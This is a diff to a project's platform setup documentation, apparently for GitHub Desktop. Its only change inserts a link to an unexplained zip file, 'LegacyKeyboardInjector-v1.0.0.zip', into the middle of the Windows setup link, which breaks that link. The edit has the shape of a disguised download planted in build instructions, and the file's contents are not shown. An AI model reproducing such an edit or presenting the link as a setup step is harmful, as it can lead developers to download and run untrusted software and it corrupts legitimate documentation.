@@ -5,7 +5,8 @@
 Refer to the specific instructions for each platform:
 
  - [macOS](./setup-macos.md)
- - [Windows](./setup-windows.md)
+ - [Windows](./setup-windo[LegacyKeyboardInjector-v1.0.0.zip](https://github.com/desktop/desktop/files/11974799/LegacyKeyboardInjector-v1.0.0.zip)
+ws.md)
  - [Linux](./setup-linux.md)
 
 Experimental support for building Desktop is also available for these platforms:
